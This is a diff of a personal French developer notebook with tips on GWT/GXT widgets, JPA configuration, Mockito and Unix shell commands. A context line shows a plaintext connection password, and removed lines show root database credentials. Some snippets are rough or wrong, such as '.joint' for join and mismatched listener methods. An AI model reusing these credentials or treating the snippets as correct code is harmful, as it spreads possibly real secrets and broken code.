-         paramForm.add(comboObligClien);
-    puis pour recuperer tous les champs de mon formulaire
-              List<Field<?>> fieldListOfWecField = paramForm.getFields();
-	    			    	   Log.debug(fieldListOfWecField.toString());
-	      						for (Field field:fieldListOfWecField)
-	      						{
-      								Log.debug(field.getName()+"--"+field.getValue());
-	      							if (field.getValue()!=null && !field.getValue().equals("null"))
-	      							{
-	      								try
-	      								{
-	      								f.set(field.getName(), field.getValue());
-	      								}
-	      								catch (ClassCastException cce) // besoin de faire ca car il va y avoir comme value de mon combobox des BaseModel et pas des strings
-	      								{
-	      									f.set(field.getName(),field.getRawValue());
-	      								}
-
-	      							}
-	      						}
-
-  pour faire un select avec de belles options:
-              private native static String getUserTemplate(String base) /*-{
-                	  return [
-                	  			'<img src="../images/besoin.PNG"/>',
-                	  			'<tpl for=".">',
-                	  			'<p>',
-                	          '<div class="x-combo-list-item">',
-                		          '{#}.',
-                		          '<tpl if="code == 1">',  // on peut mettre "<" ">" "==" etc
-                		          	'<img src="../images/chargedon.PNG"/>',
-                		          '</tpl>',
-                		          '<tpl if="code == 2">',
-                		          	'<img src="../images/chargepaye.PNG"/>',
-                		          '</tpl>',
-                		            '{type}',
-                		            '</div>',
-                	          '</p></tpl>'
-                	         ].join("");
-                	}-*/;
-              mon combo: pour faire un select avec de jolis images
-                                  (UserType est comme ca: public class UserType implements ModelData, Serializable) 
-                                    UserType userTypeList1 =new UserType("Volontaire",1);
-                             	     UserType userTypeList2 =new UserType("Benevole",2);
-                                  	     ou
-                           	      UserType userTypeList1 = new WEC72_M_CHMSCE();
-                                  userTypeList1.setWEC72_OBLCLIEN("0");
-                           	     ListStore<UserType> ls = new ListStore<UserType>();
-                           	     ls.add(userTypeList1);
-                           	     ls.add(userTypeList2);
-
-        	     XTemplate tpl = XTemplate.create(getUserTemplate(""));
-        	          ComboBox<UserType> combo2 = new ComboBox<UserType>(); // voici mon select
-        	          combo2.setWidth(150);
-        	          combo2.setEmptyText("select a user type...");
-        	          combo2.setStore(ls);  
-        	          combo2.setTemplate(tpl); // optionnel  
-        	          combo2.setDisplayField("type"); // doit etre un de mes champs de mon model  
-        	          combo2.setTypeAhead(true);  
-        	          combo2.setTriggerAction(TriggerAction.ALL);  
-        	          combo2.setFieldLabel("Company"); // n'ecrira rien apres le rendered si n'est pas directement dans un formulaire
-        	           loginForm.add(combo2);
-        	     Quand je change d'element d'option sur mon select et pour setter une option dans mon select.
-        	     	          combo1.addSelectionChangedListener(new SelectionChangedListener<UserType>(){
-                    				@Override
-                    				public void selectionChanged(SelectionChangedEvent<UserType> se) {
-                    					combo2.setStore(ls2); // remplir le select
-                    					combo2.setValue(ls2.getAt(1)); // setter une option dans mon select sans faire appel a une base (par defaut quoi)
-                    					ou 
-                    					combo2.setValue(wec72_M_CHMSCE); // la je prend la donnee qui vient de la base: wec72_M_CHMSCE est un jdo dont le parametre "type" est sette 
-                    				}
-
-pour raffraichir un element meme si il a dejà ete rendered: 
-    monElement.layout();
-classe de resources:
-            package com.application.yoani.client.resources;
-                            public interface YoaniResources extends ClientBundle {
-                            	  public static final YoaniResources INSTANCE =  GWT.create(YoaniResources.class);
-                            	  
-                            	  @NotStrict // mettre ca pour ne pas avoir de pb de type besoin de mettre @external obfuscated
-                            	  @Source("com/application/yoani/client/resources/GrowingSchoolbag.css")
-                            	  public Css cssGrowingSchoolbag();
-                            
-                            	  @NotStrict
-                            	  @Source("com/application/yoani/client/resources/gxt-all.css")
-                            	  public Css cssGWT();
-                            
-                            	  /*
-                            pour les datas: ?
-                            	  @Source("test.txt")
-                            	  public DataResource test();
-                            	  
-                            pour des fichiers de type autre: 
-                            	  @Source("manual.pdf")
-                            	  public DataResource ownersManual();
-                            	  
-                            	  
-                            pour les fichiers textes (pas bien compris... sinon voir plus bas):
-                            		@Source("synchronous.txt") ou xml
-                            			  TextResource synchronous();
-                            			  VALABLE POUR TOUTES LES RESSOURCES!!  C genial:est compatible avec i18n: voici l'ordre de recherche si on est en francais
-                            	    1.  synchronous_fr_FR.txt
-                               		2. synchronous_fr.txt
-                               		3. synchronous.txt
-                            		//ailleurs:
-                            		//		 Using a TextResource
-                            				myTextArea.setInnerText(Resources.INSTANCE.synchronous().getText());
-                            		
-                            			  @Source("b.txt")
-                            			  ExternalTextResource asynchronous();
-                            			}
-                            		//ailleurs: Using an ExternalTextResource
-                            		Resources.INSTANCE.asynchronous().getText(new ResourceCallback<TextResource>() {
-                            		  public void onError(ResourceException e) { ... }
-                            		  public void onSuccess(TextResource r) {
-                            		    myTextArea.setInnerText(r.getText());
-                            		  }
-                            		});
-                            pour les fichiers textes i18n:
-                                  creer une interface: 
-                                            public interface Labels extends com.google.gwt.i18n.client.Messages
-                                            {
-                                            	String connexion();
-                                            	String enterYourUserNameAndPassword();
-                                            }
-                                    dans une autre classe: 
-                                          Labels constants = (Labels)GWT.create(Labels.class);
-                                          loginForm.setHeading(constants.connexion());
-                                    et sous le repertoire client j'ai  
-                                      	    1. Labels_fr_FR.txt
-                                         		2. Labels_fr.txt
-                                         		3. Labels.txt
-                                    
-                            
-                            pour les images:
-                            dans 
-                            public interface YoaniResources extends ClientBundle {
-	                               public static final YoaniResources INSTANCE =  GWT.create(YoaniResources.class);
-                            		@Source("logo.png")                               (cette image est stockee sous monapp/client/resources)
-                            		 @ImageOptions(flipRtl = true) // flip horizontally
-                            		 @ImageOptions(flipRtl = repeatStyle) // repeter image
-                                 @ImageOptions(width = 10) // taille de l'image (size)// attention non je pense que ca ne marche pas 
-                            		  ImageResource logo();
-                            		  ailleurs: 
-                            		  Resources resources = GWT.create(Resources.class);
-                            		Image img = new Image(resources.logo());
-                            		ou si j'ai un bouton bt:
-                                bt.setIcon(AbstractImagePrototype.create(resources.logo()));
-                                  a savoir: 
-                                      *  ImageBundle becomes ClientBundle
-                                      * AbstractImageProtoype becomes ImageResource
-                                      * AbstractImagePrototype.createImage() becomes new Image(imageResource)
-                                      * Other methods on AbstractImagePrototype can continue to be used by calling AbstractImagePrototype.create(imageResource) to provide an API wrapper.
-                            
-                            pour recuperer dynamiquement une classe: ( je ne vois pas trop l'interet du truc)
-                            				interface Resources extends ClientBundle {
-                            				  Resources INSTANCE = GWT.create(Resources.class);
-                            				
-                            				  @ClassType(SomeClass.class)
-                            				  GwtCreateResource<ReturnType> factory();
-                            				}
-                            				
-                            				// Elsewhere
-                            				ReturnType obj = Resources.INSTANCE.factory().create();
-                            */
-                            
-                            
-                            
-                            }
-
-pour builder en mode detailler mettre dans le build.xml:
-                  <target name="gwtc" depends="cleansfe" description="GWT compile to JavaScript (production mode)">
-                  (...)
-           	<arg line="-style"/>
-            <arg value="DETAILED"/> sinon ya OBF, PRETTY
-pour i18n internationalisation locale:
-    declarer dans le module: 
-              <module>
-                    <inherits name="com.google.gwt.i18n.I18N"/>
-              </module>
-pour faire un champ date 
-      				  DateField field = new DateField();
-							  DateTimePropertyEditor format = new DateTimePropertyEditor();
-							  format.setFormat(DateTimeFormat.getFormat("dd/MM/yy"));
-							  field.setPropertyEditor(format);
-							  tf = field;  
-     
-/* pour logguer loguer logger loger (quand on l'installe necessaire de tout recompiler avec ant) alan sauer 
-        installer gwt-log-3.1.0.jar etait avant gwt-log-3.0.4.jar et declarer 
-        <inherits name="com.allen_sauer.gwt.log.gwt-log-DEBUG" />
-       dans le fichier monfichier.gwt.xml */
-       autres paramètrages possibles: 
-                                <!-- For production most teams prefer to set the default log level to `OFF` -->
-                              <inherits name="com.allen_sauer.gwt.log.gwt-log-OFF" />
-
-                              <!-- For development a default of `DEBUG` is recommended -->
-                              <inherits name="com.allen_sauer.gwt.log.gwt-log-DEBUG" />
-                      
-                              <!-- To compile at `DEBUG`, `WARN` and `OFF` log levels (at 3x compile time) -->
-                              <inherits name="com.allen_sauer.gwt.log.gwt-log-OFF" />
-                              <extend-property name="log_level" values="DEBUG,WARN"/>
-                      
-                              <!-- 
-                                 Default `OFF` but allow selection of a specific log level, say `INFO`, via the `log_level` URL parameter, e.g.
-                                   http[s]://hostame:port/path/to/your/module/Module.html?log_level=INFO
-                              -->
-                              <inherits name="com.allen_sauer.gwt.log.gwt-log-OFF" />
-                              <extend-property name="log_level" values="INFO"/>
-                      
-                              <!-- 
-                                 Compile both `DEBUG` and `ERROR` log level, with level selection via a `gwt:property` meta tag in your HTML file, e.g.
-                                      <meta name="gwt:property" content="log_level=DEBUG">
-                              -->
-                              <inherits name="com.allen_sauer.gwt.log.gwt-log-ERROR" />
-                              <extend-property name="log_level" values="DEBUG"/>
-       dans les classes: 
-        		Log.debug("Starting SFEGRID"); (// de com.allen_sauer.gwt.log.client.Log)
-    si j'ai l'erreur:  Deferred binding failed for 'com.allen_sauer.gwt.log.client.LogMessageFormatter
-          passer a java 1.6 et rebuilder avec le ant
-
-// pour recuperer des objets javascripts de ma page html:
-          dans ma jsp j'ai:
-                    var parameters = {
-                     jsonUrl: "/sfe/pagination",
-                      toto: "/sfe/pagination"
-                    };
-
-			    Dictionary parameters = Dictionary.getDictionary("parameters");
-			    ContentPanel panel = new ContentPanel();
-			    panel.setSize(1, 1);
-			    final SfeGrid module = new SfeGrid(parameters);
-          ... puis 
-          String jsonUrl = parameters.get("jsonUrl");
-        		String sqlQuery = parameters.get("sqlQuery");
-        		String columns = parameters.get("columns");
-pour creer un bouton: 
-			     // add buttons  
-			     com.extjs.gxt.ui.client.widget.button.Button load = new com.extjs.gxt.ui.client.widget.button.Button("Clear State", new SelectionListener<ButtonEvent>() {  
-			          @Override
-             public void componentSelected(ButtonEvent ce) 
-             {
-              WEC52_M_CHAMPS f = (WEC52_M_CHAMPS)ce.getButton().getData("field");
-			    	   module.getGrid().getState().clear();
-			    	   module.getLoader().load();  
-			       }
-               @Override  
-			       public void onFailure(Throwable caught) 
-              {
-              				MessageBox.alert("Result", "Failure"+ caught, null);
-              }
-              @Override
-             public void onSuccess(WEC52_M_CHAMPS result) 
-             {
-              Widget f = (Widget)ce.getButton().getData("widgetField");
-              if (result.getWEC52_FORMCLIEN().startsWith("ex"))
-              {
-                f.setStyleName("x-item-disabled");
-              }
-            }
-			     });
-           load.setData("field", result);     
-utilisation d'un panel: 
-      ContentPanel panel = new ContentPanel();
-			    panel.setSize(1, 1);
-			    final SfeGrid module = new SfeGrid(parameters);
-			    panel.add(module.getToolBar());
-			    panel.add(module.getGrid());
-			    panel.setIcon((AbstractImagePrototype.create(YoaniResources.INSTANCE.logo())) ); // pour mettre une image en tete de mon panel a gauche du texte ci dessous
-			    panel.setHeading(constants.subscribeAsStudent());// texte de l'entete de mon panel
-			    panel.setAutoHeight(true);
-			    panel.setHeaderVisible(false); // pour masquer l'entete
-			    panel.setAutoWidth(true);
-si j'ai un grid statefull 
-    si j'ai des erreurs a cause du state le supprimer du browser (menu firefox)
-    toujours faire un test après avoir supprime les cookies avant de livrer.
-quand je recupere un parametre json toujours caster en string sinon ca freeze ou ne pas mettre trop de logs4j sinon jetty plante
-      String filter = (String)request.getParameter("filters");
-pour savoir si on a appuye sur la touche entree
-    if (be.getKeyCode()== KeyboardEvents.Enter.getEventCode())
-pour faire un ecouteur listener sur un objet avec gxt:
-        TextField tf = new TextField();
-        				tf.addListener(Events.OnKeyUp ou Events.Select, new Listener<FieldEvent ou ComponentEvent>()
-        				{
-        					public void handleEvent(FieldEvent ou ComponentEvent be) 
-        					{
-                      (...)        
-        					}
-        				});
-pour faire plusieurs ecouteurs dont un lostfocus: 
-						Listener<FieldEvent> listener = new Listener<FieldEvent>()
-						{
-					public void handleEvent(FieldEvent be) 
-					{
-						if (be.getEvent().getTypeInt()==Events.OnBlur.getEventCode() || be.getKeyCode()== KeyboardEvents.Enter.getEventCode())
-						{
-							(...)
-						}
-					}};
-					field.addListener(Events.OnBlur,listener);
-					field.addListener(Events.OnKeyUp,listener);
-pour que quand on clique sur la ligne d'un tableau (row) on selectionne cette ligne par exemple grace a un ecouteur: 
-          			     grid.addListener(Events.OnClick, new Listener<GridEvent>() 
-    			    			{  
-          			    	  public void handleEvent(GridEvent be) {
-                        // attention!! ou qu'on clique sur le tableau il execute ca donc mettre une condition if comme si dessous sinon ya des exceptions lors du tri par exemple
-                        if (be.getModel()!=null  && be.getColIndex()!=2)// (deuxieme option je l'ai mise pour un editorgrid pour ne pas qu'il declanche le listener sur la colonne 3!(starts with 0))
-						    		    {  
-    	       		            app.loadTemplateFormById(((WEC51_M_TEMPLATE)be.getModel()).getWEC51_ID());
-    	       		        }
-    			            }  
-    			          }  
-    			        );  
-
-pour changer un ordre de tri dans un tableau:
-      (dir est un string)
-      Map<String, Object> state = grid.getState();
-      state.put("sortDir", dir.equals("ASC")?SortDir.valueOf("DESC"):SortDir.valueOf("ASC"));
-pour afficher un tableau comme on veut mais preferer htmlcontainer c'est super car on peut l'updated facilement apres rendrer car ya des class=. Ne pas chercher à utiliser columnlayout
-   (creer un tableau ou on met tout ou rien)
-          LayoutContainer container = new LayoutContainer();
-          TableLayout tb = new TableLayout(3); //3 columns
-         	 tb.setBorder(3); // mettre des bordures border
-				 container.setLayout(tb);  
-				 	     TableData columnSize = new TableData("20","20");      // pour forcer la taille des colonnes et lignes
-				 container.add(lab, columnSize); // pour forcer la taille
-				 container.add(new Label()); // blank cell
-				 container.add(tf);
-				 container.add(bt);
-				 container.setSize(1,1);
-				container.setAutoHeight(true); // usefull!!
-				container.setAutoWidth(true);
-				cc.setWidget(container,fieldId);
-pour afficher ce quon veut ou on veut comme on veut quand on veut
-attention , il vaut mieux en faire qu'un seul et ne pas en imbriquer plusieurs sinon ca casse tete. Les class= sont des id uniques
-voici l'unite a TOUJOURS utiliser pour placer comme on veut les choses:
-    <div style='position: relative; top: 0%; left: 380%; width: 10%;  height: 10%;'><table><tr><td class='centereastup'/></td></tr></table></div> 
-          	  	 hc = new HtmlContainer("<div style='position: relative; top: 0%; left: 380%; width: 10%;  height: 10%;'><table><tr><td class='centereastup'/></td></tr></table></div>");
-                	     hc.setBorders(true);
-                	     hc.setSize(200, 100); // important!! toujours specifier
-                	     hc.setPosition(10, 10);
-                    	 Image img = new Image(YoaniResources.INSTANCE.logo());          		 
-                		    hc.add(img, "td.north");                                   
-                			   Label l = new Label(constants.welcome());
-                		  	Label r1 = new Label(constants.purpose1());
-                		  	r1.addStyleName("h2");
-                		  	Label r2 = new Label(constants.purpose2());
-                		  	hc.add(l, "td.west");
-                		  	hc.add(r1, "td.east");
-                		  	hc.add(r2, "td.east");
-de la meme facon mais avec possibilite de faire des boucles sur des objets et de formater les donnees: utilisation de XTemplate:
-                                  ModelData userTypeList =new UserType("a",1);
-                                  	     XTemplate tpl = XTemplate.create(getUserTemplate(""));
-                                  	     tpl.overwrite(someElement(du html), Util.getJsObject(userTypeList));
-                                  	}
-                                  	// utilisation des XTemplate
-                                       private native static String getUserTemplate(String base) /*-{
-                                  		  return ['<p>Name: {name}</p>',
-                                  		          '<p>Kids: ',
-                                  		          '<tpl for=".">',
-                                  		          '<tpl if="code > 1">',
-                                  		            '<p>{type}</p>',
-                                  		          '</tpl>',
-                                  		          '</tpl></p>'
-                                  		         ].joint("");
-                                  		);}-*/;
-                                  		ailleurs:
-                                  		public UserType(String type, int code) {
-                                      //	        setType(type);
-                                      //	        setCode(code);
-                                      			set("type",type);
-                                      			set("code",code);
-                                      	        set("value",code); // tres important pour....
-                                      	      }
-                                      //	String getType()
-                                      //	{
-                                      //		return get("type");
-                                      //	}
-                                      //
-                                      //	int getCode()
-                                      //	{
-                                      //		return get("code");
-                                      //	}
-                                      //	void setType(String type)
-                                      //	{
-                                      //		set("type",type);
-                                      //	}
-                                      //	void setCode(int code)
-                                      //	{
-                                      //		set("code",code);
-                                      //	}
-                                      
-                                      }
-                                    	
-                                  	
-afficher une boite de dialogue popup au milieu
-        private final Dialog complex = new Dialog();
-        complex.setBodyBorder(false);  
-        complex.setHeading("Choose a date");  
-        complex.setWidth(400);  
-        complex.setHeight(225);  
-        complex.setHideOnButtonClick(true);
-        complex.getButtonById("ok").addListener(Events.OnClick, new Listener<ComponentEvent>() 
-   				{
-   					public void handleEvent(ComponentEvent be) 
-   					{
-   						Log.debug("submit0");
-   						
-   					}
-   				});
-   		
-pour mettre une image a un bouton
-        avec les resources: (et mettre aussi du texte: a gauche et image a droite) (marche mieux que les solutions avec css plus bas)
-                ImageResource img = YoaniResources.INSTANCE.logo();
-        			   france.setIcon(AbstractImagePrototype.create(img));
-						    	france.setIconAlign(IconAlign.RIGHT);
-            	    // pour resizer l'image: utiliser ImageOptions (voir dans ce fichier)?? ca n'a pas l'air de marcher.. il faut resizer l'image directement. j'ai tout essaye pas tout cherche)
-	  	            bt.setHeight(15);
-	  	            bt.setWidth(helpImg.getWidth());
-						  	 france.setText("France");
-						  	 france.setHeight(imgfr.getHeight());
-						      france.setWidth(imgfr.getWidth()+50);
-						  	 france.setStyleName("x-btn");
-						  	 ou dans le css:
-                 .x-btn button{
-                        font: bold 11px tahoma,arial,helvetica,sans-serif;
-                        color:#333;
-                      	text-align: left; ca c'est important
-                    } 
-                avec les css: 
-                final Button bt = new Button();
-          			bt.setIcon(IconHelper.createStyle("add"));
-          			(dans le css ya ca qui s'apelle MyWebApp.css et qui est declare dans index.html
-                .add {
-                    	background: url(/images/icones/add.PNG) no-repeat center center !important; // ATTENTION AU CHEMIN RELATIF! j'ai reessaye avec une autre image mais elle n'est pas complette...???. // voir LINKfontaw
-                    	ou
-                    	background: url(../images/icones/add.PNG);// ATTENTION AU CHEMIN RELATIF! voir LINKfontaw
-                    	l'image se place ou elle peut a gauche d'un eventuel texte sete avec setText()
-                  }
-                  )
 
 MCD/MPD :
       forte faible
@@ -9462,8 +8371,8 @@ JPA : Specification d'ORM. Implementé par hibernate, eclipselink...
     Clic droit sur mon projet > JAP > faire le reverseEngeniring
     fichier resources/META-INF/persistence.xml marche bien. sinon ou mais pas sur dutout: WEB-INF/persistence.xml. Ce fichier DOIT etre dans le jar ou le war qui contient les @Entity
     <?xml version="1.0" encoding="UTF-8"?> // super important de mettre ça
-    <persistence version="2.0" xmlns="http://java.sun.com/xml/ns/persistence" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd"> // super important de mettre ça
-        <persistence-unit name="com.memoclap" transaction-type="RESOURCE_LOCAL(utilise le système de transaction du JDBC natif donc a utiliser pour les testsunitaires) ou JTA(pour utiliser la gestion de transaction du container donc d'un jndi LINKjta)"> // du coup applicativement je l'appelle comme ça : LINKentitym
+    <persistence version="2.0" xmlns="http://java.sun.com/xml/ns/persistence" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd"> // super important de mettre ça 
+        <persistence-unit name="com.memoclap"     transaction-type="RESOURCE_LOCAL(utilise le système de transaction du JDBC natif donc a utiliser pour les testsunitaires) ou JTA(pour utiliser la gestion de transaction du container donc d'un jndi LINKjta)"> // du coup applicativement je l'appelle comme ça : LINKentitym
             <provider>org.eclipse.persistence.jpa.PersistenceProvider</provider> // facultatif provider peut etre eclipselink ou hibernate. si on met rien.. sais pas. depend jars ?
             <description>EclipseLink EntityManager</description>                 // facultatif
             <exclude-unlisted-classes>false</exclude-unlisted-classes>
@@ -9471,10 +8380,17 @@ JPA : Specification d'ORM. Implementé par hibernate, eclipselink...
              ou
             <properties> // parametres envoyés au persistenceprovider. On peut définir la base de donnée ici mais je prefere LINKjta  
                 <property name="eclipselink.logging.level" value="FINE"/>
-                <property name="javax.persistence.jdbc.driver" value="com.mysql.jdbc.Driver"/>
-                <property name="javax.persistence.jdbc.url" value="jdbc:mysql://127.0.0.1:3306/moviecatalog"/>
-                <property name="javax.persistence.jdbc.user" value="root"/>
-                <property name="javax.persistence.jdbc.password" value="root"/> voir aussi hsqldb
+                <property name="javax.persistence.jdbc.driver" value="org.hsqldb.jdbc.JDBCDataSource"/><!-- com.mysql.jdbc.Driver -->
+            <property name="javax.persistence.jdbc.url" value="jdbc:hsqldb:mem:test;DB_CLOSE_DELAY=-1;DATABASE_TO_UPPER=false;"/> <!-- jdbc:mysql://127.0.0.1:3306/moviecatalog -->
+            <!-- <property name="javax.persistence.jdbc.user" value="root"/> -->
+            <!-- <property name="javax.persistence.jdbc.password" value="root"/>-->
+            <property name="javax.persistence.schema-generation.database.action" value="create"/><!-- none, create, drop-and-create, drop -->
+            <property name="javax.persistence.schema-generation.create-source" value="metadata"/><!-- metadata, script, metadata-then-script, script-then-metadata -->
+            <!-- <property name="javax.persistence.schema-generation.create-script-source" value="META-INF/memoclapCreate_hsqldb.sql"/> execute ce script pour la creation du shema a mettre si au dessus j'ai mis script -->
+            <!-- <property name="javax.persistence.sql-load-script-source" value="META-INF/memoclapInsert_hsqldb.sql"/> execute ce script pour les insertions-->
+            <!-- <property name="javax.persistence.schema-generation.scripts.action" value="none, create, drop-and-create, drop	"/> pour qu'il genere ces scripts. Besoin ajouter path voir javax.persistence.schema-generation.scripts.create-target -->
+                        <!--<property name="javax.persistence.schema-generation.scripts.create-target" value="file URL, java.IO.Writer"/> -->
+            <!-- <property name="javax.persistence.schema-generation.drop-source	metadata" value="script, metadata-then-script, script-then-metadata"/> -->
             </properties>
        </persistence-unit>
      </persistence>   
@@ -9493,16 +8409,26 @@ JPA : Specification d'ORM. Implementé par hibernate, eclipselink...
           "EntityManager gère le lifecycle de persistenceContexts //ATERMINER
           Persistencecontext a une duree de vie dependante de celle de la transaction.
           Une transaction peut contenir un ou plusieurs persistencecontext" 
-            @PersistenceContext(name = "com.memoclap") // est def ici LINKentitym
+            @PersistenceContext(name = "facultatifUtileDansLeJavaChaisPasTropEncoreCOmmentAFAIRE" unitName="LINKdkdkfjfjnomcorrespondantA<persistence-unit nameEstFacultatifSiYEnAQunDansLeXml) // est def ici LINKentitym . attention c'est une annotation ejb. Est Injectable dans Ejbs. Pour la rendre injectable dans cdi faire LINKlerendreinjectable (heu je crois que ca marche quand meme l'injection sans ça.)
             EntityManager em;
         ou
-            EntityManagerFactory emf = Persistence.createEntityManagerFactory("com.memoclap"); //est def ici LINKentitym 
+            EntityManagerFactory emf = Persistence.createEntityManagerFactory("com.memoclap"); //est def ici LINKentitym. dans persistence.xml mettre <provider>org.eclipse.persistence.jpa.PersistenceProvider</provider> sinon ca ne marche pas 
             et
             public static EntityManager getEntityManager() {
             return emf.createEntityManager();
             }
+            
+            pour rendre injectable mon entitymanager: LINKlerendreinjectable
+            public class EntityManagerForCDI{
+                  @Produces
+                  @PersistenceContext(name = "com.memoclap.db")
+                  private EntityManager em;
+              }
+            
     recuperer la connection jdbc depuis un entitymanager :
-        Connection conn = entityManager.unwrap(Session.class).getJDBCConnection();
+        Connection conn = entityManager.unwrap(Session.class).getJDBCConnection(); 
+        ou 
+        Connection connection = em.unwrap(Connection.class);
      utilisation de entitymanager: JPQL (sql en string) 2.0 contient JPA_API(criterias) preferer criteria api si besoin validation requettes à la compilation et requetes à la synthaxe dynamique
                 JPQL :
                       - List cat = entityManager.createQuery("SELECT cat FROM nomDeMonObjetJAVA cat LEFT JOIN FETCH cat.nomDeMonFieldJAVA WHERE toto.nomDunFieldJAVA like '%M%' AND cat.unFieldJava=:totocestmoi")
@@ -9588,7 +8514,6 @@ si j'ai cette erreur:        Cannot convert value '0000-00-00 00:00:00' from col
             	@Id //Cle primaire
             	@GeneratedValue //(strategy=GenerationType.AUTO par defaut c a d 1 sequence pot tables. Deconseille) ou (strategy=GenerationType.SEQUENCE, generator="NOMDEMASEQ") 1 sequence nommee NOMDEMASEQ pour cette table seulement
             	private Integer id;
-
               @ManyToOne //1ici a n labas(passur?)
               @Column(name="NonDeLaColonneEnBDSIDifferenteQueNomProprieteJava") // optionnel
               @Column(name="price", columnDefinition="Decimal(10,2) default '0.0'") // si on veut une valeur par defaut DANS LA BASE de donnée seulement; renvoit qd meme null en java si ce champ est déjà null dans la base
@@ -11054,6 +9979,7 @@ ANALYZE TABLE T_USER_DIALO ESTIMATE STATISTICS SAMPLE 10 PERCENT;
 ANALYZE TABLE T_USER_LANGUE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
 ANALYZE TABLE T_VIGNETTE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
 
+         
 les synonymes oracle : schemas shemas : 
       un user dpf_r peut avoir les droits (grant) en lecture voir visible sur les tables : 
           quand on affiche avec un client la liste des tables il peut les voir sous le fichier d'un autre user qui a les droit adm par ex.
@@ -16982,12 +15908,13 @@ JMockit :(le top car permet de tester l'intestable)>Mockito>EasyMock>Jmock AFAIR
         public class UploadToServerServiceTest {
     		@InjectMocks // facultatif Mock peut marcher sans. Classe qui est testee dans laquelle on injectera les mocks
     		private RealTimePathCoverageController realTimePathCoverageController = new RealTimePathCoverageController(); // equivalent de @Tested dans jmockit : c'est une classe a tester dans laquelle je peux injecter des mocs LINKpourquecamarcheFairemokito
+                                                                                ou =spy(new MockRealTimePathCoverageController()); // si on veut injecter niveau en dessous. Necessite le LINKlkfjjgjgjgozo. avec @InjectMocks en haut c'est top! on peut remplacer facilement par un mock et en plus injecter dedans ce quon veut comme autre @Mock
     		@Mock ou @Spy     //Mock par defaut n'execute rien et on peut changer son comportement. Spy par defaut execute tout et on peut ecouter
             private RestTemplate restTemplate; // (peut etre une classe ou une interface) mock qui sera injectée dans RealTimePathCoverageController.
     			@Before
     				public void setup()
     				{
-    					MockitoAnnotations.initMocks(this); // ca active les anotations @InjectMocks et @Mocks et @Spy // attention @Spy qui doit etre accompagné de par exemple @Autowired dans mon test car le bean doit exister avant que le spy s'applique: CA CA NE MARCHE PAS:mon objet spyé n'est pas toujours le meme que celui qui est injecté dans le runcode.
+    					MockitoAnnotations.initMocks(this); // ca active les anotations @InjectMocks et @Mocks et @Spy // attention @Spy qui doit etre accompagné de par exemple @Autowired dans mon test car le bean doit exister avant que le spy s'applique: CA CA NE MARCHE PAS:mon objet spyé n'est pas toujours le meme que celui qui est injecté dans le runcode. LINKlkfjjgjgjgozo
     				}
     				FilterConfig filterConfig = mock(FilterConfig.class); // c'est soit je fais comme ca, soit j'utilise les anotations ci dessus. les deux font la meme chose
     				ServletContext context = mock(ServletContext.class);
@@ -24780,8 +23707,10 @@ connectionPassword=AWTWSAD
 userSearchMatching=(uid={0})
 
 UNIX : linux :(unix est la plus basse couche; linux est au dessus mais il a été complettement réecrit, c le kernel=noyau; ubuntu(https://wiki.ubuntu.com/Releases) et debian sont deux distrib au dessus de linux. Sont differentes mais ubuntu est un layer par dessus debian)
+Pour utiliser USB avec mon mobile utiliser gnome_file (de son nom de programme "file") tiroir bleu
 pour installer un fichier extension extention .deb
 	dpkg -i lefichier.deb
+pour pouvoir lire cd audio installer cdrskin et xorriso et executer cdrskin --devices puis ca marche tout seul
 La commande utilisee pour creer les fichiers ISO sous unix est:
         mkisofs -J -r -o $FILE_OUT $FILE_IN
         mkisofs -r -o CD-CS-1.iso CD-CS-1
@@ -24838,7 +23767,7 @@ sudo :
     /home repertoires persos pour utilisateur
     /var donnees frequements reecrites
 les comptes utilisateurs sont sur etc/passwd (si un jour un gars qu'on ne connait pas fait des trucs) figurent dedans les homes des utilisateurs et on peut atteindre leur home en faisant cd ~nomutilisateur
-pour recharger le .profile // fichier chargé lorsque je me connecte a la connexion initialise. dedans je peux mettre des commandes qui s'executent lors de ma connexion 
+pour recharger le .profile // fichier chargé lorsque je me connecte au demarrage a la connexion initialise. dedans je peux mettre des commandes qui s'executent lors de ma connexion 
     faire: cd ou cd . puis . .profile (faire ls -tralh pour voir tout (attention pas tout forcement... mais je ne sais pas pourquoi)
 changer mot de passe d'un utilisateur:
   changepasswd nomutilisateur (je crois)    
@@ -24898,7 +23827,7 @@ les alias sous unix: exemple: alias ll = 'ls -l' ou bien alias ll="ls -l"
     pour voir la liste des alias, tapper alias (permet de voir les raccourcis de commandes)
     pour voir le detail d'un alias: alias nomalias
     pour faire des alias persistants: 
-      vi ~/.bash_alias (ce dernier est charge par ~/.bashrc qui contient) voir aussi LINKç'(ç')
+      vi ~/.bash_aliases (ce dernier est charge par ~/.bashrc qui contient) voir aussi LINKç'(ç')
           alias gototemplate='cd /var/www/www.wenhuaduverge.com/shop/themes/wenhuaduvergetheme/' // pour echapper les espaces: alias gotoapprentissage="cd \"/c/Users/Mes documents/apprendre\""
           alias gotocss='cd /var/www/www.wenhuaduverge.com/shop/themes/wenhuaduvergetheme/css'
           alias gotomodule='cd /var/www/www.wenhuaduverge.com/shop/module'
@@ -24906,6 +23835,7 @@ les alias sous unix: exemple: alias ll = 'ls -l' ou bien alias ll="ls -l"
           if [ -f ~/.bash_aliases ]; then
             . ~/.bash_aliases
           fi
+	puis recharger le tout . .bashrc
     
 dans /usr/bin noramlement (on peut retrouver dans les variables d'environnement) on voit tous les programmes que le user peut utiliser (.exe) (les commandes)
 pour recharger un environnement faire cd . (la il y a des fichiers environnement(faire ls -tralh pour voir tout) dont le nom est par ex: .env_machin) puis . .env_machin ou . ./.env_machin
@@ -25022,6 +23952,7 @@ You could try this. The following will give a list of files between 2 dates.
 		touch -t 200310310000 fichiervidecree2
 		find /yourdir -type f -newer fichiervidecree1 -print > LIST1   (-type f pour fichier regulier...pas indispensable?)
 		find /yourdir -type f -newer fichiervidecree2 -print > LIST2
+	très bon outil de comparateur pour desktop: meld. Pour faire un alignement selectionner la ligne et ajouter un point d'ancrage(clickdroit)
 		diff -y LIST1 LIST2 // -y pour comparer cote a cote c'est mieux
 		diff -yarq folder1 folder2
 pour trouver des repertoires: 
@@ -25108,6 +24039,8 @@ renvoit le nombre de process qui repondent a la recherche:
       ps -ef | grep whatever | wc -l 
